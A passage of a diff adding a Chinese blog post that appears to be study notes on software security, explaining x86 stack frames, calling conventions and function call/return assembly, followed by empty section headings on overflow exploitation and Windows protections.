+<li>EBP（<a href="extended_base_pointer" title="extended_base_pointer">基址指针寄存器</a>）：存放一个永远指向系统栈<strong>最上面一个栈帧的底部</strong></li>
+<li>当前函数栈帧：ESP和EBP之间的内存空间<ol>
+<li>局部变量：为函数局部变量开辟内存空间</li>
+<li>栈帧状态值：保存前栈帧的顶部和底部，用于本栈帧弹出后恢复上一个栈帧（实际只保存底部，顶部可以通过堆栈平衡计算得出）</li>
+<li>函数返回地址：保存当前函数调用前的断点信息，也就是<strong>函数调用前的指令位置</strong></li>
+</ol>
+</li>
+<li>另外的特殊寄存器：EIP（指令寄存器）存放下一条等待执行的指令地址</li>
+</ol>
+</li>
+<li><h4 id="不同编译器调用方式差异"><a href="#不同编译器调用方式差异" class="headerlink" title="不同编译器调用方式差异"></a>不同编译器调用方式差异</h4></li>
+</ol>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>C</th>
+<th>SysCall</th>
+<th>StdCall</th>
+<th>BASIC</th>
+<th>FORTRAN</th>
+<th>PASCAL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>参数入栈顺序</td>
+<td>右-&gt;左</td>
+<td>右-&gt;左</td>
+<td>右-&gt;左</td>
+<td>左-&gt;右</td>
+<td>左-&gt;右</td>
+<td>左-&gt;右</td>
+</tr>
+<tr>
+<td>恢复栈平衡操作的位置</td>
+<td>母函数</td>
+<td>子函数</td>
+<td>子函数</td>
+<td>子函数</td>
+<td>子函数</td>
+<td>子函数</td>
+</tr>
+</tbody></table>
+<ol start="4">
+<li><h4 id="函数调用大致步骤："><a href="#函数调用大致步骤：" class="headerlink" title="函数调用大致步骤："></a>函数调用大致步骤：</h4><ol>
+<li>参数入栈：按入栈顺序</li>
+<li>返回地址入栈：将当前代码区调用指令的下一条指令地址压入栈，供函数返回时继续执行</li>
+<li>代码区跳转：处理器从当前代码区跳转到被调用函数的入口</li>
+<li>栈帧调整：<ol>
+<li>EBP入栈：保存当前栈帧状态值，以供后面恢复本栈帧时使用</li>
+<li>ESP装入EBP，更新栈帧底部：将当前栈帧切换到新栈帧</li>
+<li>把ESP减去所需空间的大小，太高栈顶：给新栈帧分配空间</li>
+</ol>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;假设函数有三个参数，依次入栈</span><br><span class="line">push canshu1    </span><br><span class="line">push canshu2    </span><br><span class="line">push canshu3    </span><br><span class="line">call 函数地址    ;call完成两项工作：a.保存返回地址（入栈当前指令在内存中的位置） b. 跳转到函数的入口地址</span><br><span class="line">push ebp    ;保存旧栈的栈底</span><br><span class="line">mov ebp ,esp    ;栈帧切换：新栈帧底替换旧栈底</span><br><span class="line">sub esp ,xxx    ;太高栈顶，为新栈帧开辟内存空间：设置新栈帧的栈顶</span><br></pre></td></tr></table></figure>
+</li>
+<li><h4 id="函数返回大致步骤："><a href="#函数返回大致步骤：" class="headerlink" title="函数返回大致步骤："></a>函数返回大致步骤：</h4><ol>
+<li>保存返回值：通常保存在寄存器EAX</li>
+<li>弹出当前栈帧，恢复上一个栈帧<ol>
+<li>在堆栈平衡的基础上，给ESP加上栈帧的大小，降低栈顶，回收空间</li>
+<li>将（当前栈帧底部保存的）前栈帧EBP值 弹入 EBP寄存器，恢复出上一个栈帧</li>
+<li>将函数返回地址弹给EIP寄存器</li>
+</ol>
+</li>
+<li>跳转：按照返回地址跳回母函数继续执行</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add esp ,xxx    ;降低栈顶，回收当前栈帧</span><br><span class="line">pop ebp    ;将上一个栈帧底部位置恢复到ebp</span><br><span class="line">retn    ;两个功能：a. 弹出当前栈顶元素（栈帧中的返回地址） b.处理器跳转到弹出的返回地址，恢复调用之前的代码区</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="扩充汇编知识书籍：《IBM-X86汇编》或《Win32汇编》"><a href="#扩充汇编知识书籍：《IBM-X86汇编》或《Win32汇编》" class="headerlink" title="+. 扩充汇编知识书籍：《IBM X86汇编》或《Win32汇编》"></a>+. 扩充汇编知识书籍：《IBM X86汇编》或《Win32汇编》</h4><h3 id="2-修改邻接变量"><a href="#2-修改邻接变量" class="headerlink" title="2. 修改邻接变量"></a>2. 修改邻接变量</h3><h3 id="3-修改函数返回地址"><a href="#3-修改函数返回地址" class="headerlink" title="3. 修改函数返回地址"></a>3. 修改函数返回地址</h3><h3 id="4-代码植入"><a href="#4-代码植入" class="headerlink" title="4. 代码植入"></a>4. 代码植入</h3><h2 id="开发shellcode"><a href="#开发shellcode" class="headerlink" title="开发shellcode"></a>开发shellcode</h2><h2 id="MetaSploit开发Exploit"><a href="#MetaSploit开发Exploit" class="headerlink" title="MetaSploit开发Exploit"></a>MetaSploit开发Exploit</h2><h2 id="堆溢出利用"><a href="#堆溢出利用" class="headerlink" title="堆溢出利用"></a>堆溢出利用</h2><h2 id="Windows异常处理机制"><a href="#Windows异常处理机制" class="headerlink" title="Windows异常处理机制"></a>Windows异常处理机制</h2><h2 id="高级内存攻击技术"><a href="#高级内存攻击技术" class="headerlink" title="高级内存攻击技术"></a>高级内存攻击技术</h2><h2 id="手机里的缓冲区溢出"><a href="#手机里的缓冲区溢出" class="headerlink" title="手机里的缓冲区溢出"></a>手机里的缓冲区溢出</h2><h2 id="其他软件漏洞利用技术"><a href="#其他软件漏洞利用技术" class="headerlink" title="其他软件漏洞利用技术"></a>其他软件漏洞利用技术</h2><h2 id="Windows安全机制"><a href="#Windows安全机制" class="headerlink" title="Windows安全机制"></a>Windows安全机制</h2><h2 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h2><h2 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h2><h2 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h2><h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><h2 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h2><h2 id="堆保护与攻击"><a href="#堆保护与攻击" class="headerlink" title="堆保护与攻击"></a>堆保护与攻击</h2><h1 id="三、漏洞挖掘"><a href="#三、漏洞挖掘" class="headerlink" title="三、漏洞挖掘"></a>三、漏洞挖掘</h1><h1 id="四、漏洞分析"><a href="#四、漏洞分析" class="headerlink" title="四、漏洞分析"></a>四、漏洞分析</h1>]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>PWN</category>
+      </categories>
+      <tags>
+        <tag>网络空间安全</tag>
+        <tag>安全漏洞</tag>
+        <tag>0day</tag>
+        <tag>Stack overflow</tag>
       </tags>
   </entry>
   <entry>
